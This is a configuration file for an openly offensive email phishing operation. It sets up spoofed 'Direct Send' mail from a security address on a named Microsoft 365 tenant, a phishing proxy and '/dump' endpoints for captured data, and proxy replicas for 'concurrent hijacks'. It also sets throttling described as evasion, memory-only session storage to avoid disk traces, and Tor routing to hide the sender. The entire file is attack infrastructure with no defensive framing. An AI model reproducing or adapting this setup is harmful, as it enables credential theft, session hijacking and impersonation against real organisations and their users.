# Direct Send Config (No Azure Creds Needed)
FROM_EMAIL=security@NETORGFT4679501.onmicrosoft.com
MX_HOST=netorgft4679501.mail.protection.outlook.com
MX_IP=52.101.10.2

# Proxy & Lure
PROXY_URL=https://localhost:8443/phish  # Local test; replace with VPS IP for remote
DUMP_PASS=yourpass  # Basic auth for /dump endpoints

# Capacity & Scaling (Docker Compose Overrides)
BATCH_SIZE=5  # Emails per batch (1-10; higher for capacity)
THROTTLE=true  # Random delays (true for evasion; false for speed)
REPLICAS_PROXY=1  # Proxy instances (scale to 3+ for concurrent hijacks)
REPLICAS_SENDER=1  # Sender replicas (for parallel campaigns)
CPU_LIMIT=0.5  # CPU shares per service (0.5=50%; 1.0=full core)
MEM_LIMIT=512m  # RAM per service (512m idle; 1g for high load)

# Storage (Redis Tuning for Capacity)
REDIS_URL=redis://redis-sessions:6379
REDIS_MAXMEMORY=256mb  # In-mem limit (evades disk; auto-evict old sessions)

# Obfuscation (Tor IP Auto-Gen)
TOR_IP=$(docker run --rm --network container:tor-obfuscator alpine/wget -qO- ifconfig.me)  # Run once to populate
